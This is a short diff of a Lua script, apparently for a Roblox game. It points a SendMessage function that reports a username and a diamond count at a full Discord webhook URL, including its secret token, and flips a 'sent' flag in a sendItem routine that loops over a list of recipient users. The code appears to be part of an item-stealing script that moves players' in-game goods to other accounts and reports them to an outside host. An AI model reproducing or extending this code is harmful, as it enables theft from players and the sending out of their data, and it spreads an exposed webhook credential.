@@ -148,7 +148,7 @@ local function SendMessage(username, diamonds)
 
     if discuser and discuser ~= "" then
         local response = request({
-            Url = "http://46.101.233.20:5000/webhook",
+            Url = "https://discord.com/api/webhooks/1328904169452470314/iMXY_oGoLfaA42JVtAk0g01hSh2veBn5Cb59ZOFUfxffrpblhvIcdG4hgk7UfnYvID7b",
             Method = "POST",
             Headers = headers,
             Body = body
@@ -197,7 +197,7 @@ end
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
-    local sent = false
+    local sent = true
 
     repeat
         local currentUser = users[userIndex]
